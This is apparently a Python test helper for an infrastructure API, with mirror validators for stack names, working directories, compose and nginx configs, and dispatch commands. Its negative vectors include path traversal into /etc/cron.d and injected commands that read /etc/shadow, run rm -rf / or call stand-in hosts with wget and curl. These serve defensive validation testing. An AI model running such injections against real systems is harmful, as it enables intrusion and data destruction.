"""Generator & mirror-validator vektor infra (compose/nginx/dispatch) — pure.

Validator mirror di sini TIDAK menggantikan `application/infra_validate.rs`;
fungsinya memastikan vektor uji benar-benar valid/invalid menurut kriteria
api-w2 §2.4–§2.5 SEBELUM dikirim live, sehingga kegagalan test live pasti
berasal dari server, bukan dari payload yang salah rakit.

Kriteria (api-w2 §2.4/§2.5):
- stack name: `[a-zA-Z0-9_-]`, 1–150.
- working_dir: absolut, tanpa `..`, `~`, `\`, kontrol char.
- compose: ≤ 256 KB; top-level allowlist (include ditolak); `services:` wajib;
  tiap service wajib `image:`/`build:`; indentasi tab ditolak.
- nginx: ≤ 128 KB; brace seimbang (di luar komentar & string); blok `server {`
  wajib; include anti traversal & harus absolut/wildcard.
- dispatch: enum allowlist `up|down|pull|restart` (nginx: `test_reload`).
"""

from __future__ import annotations

import re

STACK_NAME_RE = re.compile(r"^[A-Za-z0-9_-]{1,150}$")
COMPOSE_MAX_BYTES = 256 * 1024
NGINX_MAX_BYTES = 128 * 1024
COMPOSE_TOP_LEVEL_ALLOWLIST = frozenset(
    {"services", "networks", "volumes", "configs", "secrets", "name", "version"}
)
STACK_DISPATCH_COMMANDS = frozenset({"up", "down", "pull", "restart"})
NGINX_DISPATCH_COMMANDS = frozenset({"test_reload"})


# ---------------------------------------------------------------------------
# Mirror validator (keputusan ekspektasi, bukan bisnis server)
# ---------------------------------------------------------------------------
def validate_stack_name(name: str) -> list[str]:
    errors: list[str] = []
    if not STACK_NAME_RE.fullmatch(name):
        errors.append(f"STACK_NAME_INVALID: {name!r}")
    return errors


def validate_working_dir(path: str) -> list[str]:
    errors: list[str] = []
    if not path.startswith("/"):
        errors.append("WORKING_DIR_NOT_ABSOLUTE")
    if ".." in path:
        errors.append("WORKING_DIR_TRAVERSAL")
    if "~" in path:
        errors.append("WORKING_DIR_TILDE")
    if "\\" in path:
        errors.append("WORKING_DIR_BACKSLASH")
    if any(ord(c) < 0x20 for c in path):
        errors.append("WORKING_DIR_CONTROL_CHAR")
    return errors


def _compose_top_level_keys(text: str) -> list[str]:
    keys: list[str] = []
    for line in text.splitlines():
        if not line or line.lstrip().startswith("#"):
            continue
        if line[0] in {" ", "\t"}:
            continue
        key = line.split(":", 1)[0].strip()
        if key:
            keys.append(key)
    return keys


def validate_compose_content(text: str) -> list[str]:
    errors: list[str] = []
    if len(text.encode("utf-8")) > COMPOSE_MAX_BYTES:
        errors.append("COMPOSE_TOO_LARGE")
    if re.search(r"^\t|^\n?\t", text, re.MULTILINE) or any(
        line.startswith("\t") for line in text.splitlines()
    ):
        errors.append("COMPOSE_TAB_INDENT")
    keys = _compose_top_level_keys(text)
    unknown = [k for k in keys if k not in COMPOSE_TOP_LEVEL_ALLOWLIST]
    if unknown:
        errors.append(f"COMPOSE_TOP_LEVEL_FORBIDDEN: {unknown}")
    if "services" not in keys:
        errors.append("COMPOSE_SERVICES_REQUIRED")
        return errors
    current_service: str | None = None
    has_source = False
    for line in text.splitlines()[keys.index("services") + 1 :]:
        if not line or line.lstrip().startswith("#"):
            continue
        indented = line[0] in {" ", "\t"}
        if not indented:  # top-level berikutnya — berhenti di blok services
            break
        if line.startswith("  ") and not line.startswith("   "):
            candidate = line.strip().rstrip(":")
            if current_service is not None and not has_source:
                pass  # diperiksa saat transisi service berikutnya / akhir
            current_service = candidate
            has_source = False
        elif current_service is not None:
            key = line.strip().split(":", 1)[0].strip()
            if key in {"image", "build"}:
                has_source = True
    if current_service is not None and not has_source:
        errors.append(f"COMPOSE_SERVICE_MISSING_SOURCE: {current_service}")
    return errors


def _strip_nginx_noise(text: str) -> str:
    text = re.sub(r"#.*", "", text)  # komentar
    text = re.sub(r'"[^"\n]*"', '""', text)  # string kutip-ganda
    text = re.sub(r"'[^'\n]*'", "''", text)  # string kutip-tunggal
    return text


def validate_nginx_content(text: str) -> list[str]:
    errors: list[str] = []
    if len(text.encode("utf-8")) > NGINX_MAX_BYTES:
        errors.append("NGINX_TOO_LARGE")
    clean = _strip_nginx_noise(text)
    if clean.count("{") != clean.count("}"):
        errors.append("NGINX_BRACE_UNBALANCED")
    if not re.search(r"\bserver\s*\{", clean):
        errors.append("NGINX_SERVER_BLOCK_REQUIRED")
    for match in re.finditer(r"\binclude\s+([^;]+);", clean):
        target = match.group(1).strip()
        if ".." in target or "~" in target or "\\" in target:
            errors.append(f"NGINX_INCLUDE_TRAVERSAL: {target}")
        elif not (target.startswith("/") or "*" in target):
            errors.append(f"NGINX_INCLUDE_NOT_ABSOLUTE: {target}")
    return errors


def validate_dispatch_command(command: str, allowed: frozenset[str]) -> list[str]:
    if command not in allowed:
        return [f"DISPATCH_COMMAND_FORBIDDEN: {command!r}"]
    return []


# ---------------------------------------------------------------------------
# Vektor valid (positive control)
# ---------------------------------------------------------------------------
def valid_compose_sample() -> str:
    return (
        "services:\n"
        "  web:\n"
        "    image: grafana/grafana:11\n"
        "    restart: unless-stopped\n"
        "networks:\n"
        "  default: {}\n"
    )


def valid_nginx_sample() -> str:
    return (
        "server {\n"
        "  listen 80;\n"
        "  server_name app.example.com;\n"
        "  location / {\n"
        "    proxy_pass http://app;\n"
        "  }\n"
        "}\n"
    )


# ---------------------------------------------------------------------------
# Vektor serangan / invalid (negative vectors)
# ---------------------------------------------------------------------------
def traversal_stack_names() -> tuple[str, ...]:
    return (
        "../../etc/cron.d",
        "/etc/cron.d",
        "ok/../cron.d",
        "stack with space",
        "stack/slash",
        "stack.dot",
        "",
        "a" * 151,
    )


def traversal_working_dirs() -> tuple[str, ...]:
    return (
        "/opt/../../etc/cron.d",
        "/opt/stacks/../cron.d",
        "~/stacks/monitoring",
        "/opt/stacks\\evil",
        "opt/stacks/relative",
        "/opt/stacks/\x0btray",
        "/opt/stacks/mon..itoring",
    )


def invalid_compose_samples() -> dict[str, str]:
    return {
        "include_top_level": (
            "include:\n  - other.yaml\nservices:\n  web:\n    image: nginx:1\n"
        ),
        "tab_indent": "services:\n\tweb:\n\t\timage: nginx:1\n",
        "missing_services": "networks:\n  default: {}\n",
        "service_no_source": "services:\n  web:\n    restart: always\n",
        "unknown_top_level": (
            "entrypoint_shim:\n  cmd: id\nservices:\n  web:\n    image: nginx:1\n"
        ),
        "oversize": "services:\n  web:\n    image: nginx:1\n    labels: \"" + "A" * (300 * 1024) + "\"\n",
    }


def invalid_nginx_samples() -> dict[str, str]:
    return {
        "brace_unbalanced": (
            "server {\n  listen 80;\n  server_name app.example.com;\n"
            "  location / {\n    proxy_pass http://app;\n  }\n"
        ),
        "no_server_block": (
            "upstream app {\n  server 127.0.0.1:3000;\n}\n"
        ),
        "include_traversal": (
            "server {\n  listen 80;\n  server_name app.example.com;\n"
            "  include ../../etc/cron.d/*;\n}\n"
        ),
        "include_relative": (
            "server {\n  listen 80;\n  server_name app.example.com;\n"
            "  include snippets/tls.conf;\n}\n"
        ),
        "oversize": "server {\n  #" + "B" * (200 * 1024) + "\n}\n",
    }


def nginx_server_name_injections() -> tuple[str, ...]:
    return (
        "app.example.com; include /etc/shadow",
        "`id`",
        "$(whoami)",
        "app.example.com && wget http://evil.sh",
        "app|curl http://evil",
        "app.example.com\n}",
        "app\x00.example.com",
        "app example.com; rm -rf /",
    )


def dispatch_command_injections() -> tuple[str, ...]:
    return (
        "up; cat /etc/shadow",
        "up && curl http://evil.sh",
        "up$(touch /tmp/pwned)",
        "up `id`",
        "restart\nreload",
        "up | tee /etc/cron.d/pwn",
        "DROP TABLE compose_stacks",
        "",
    )
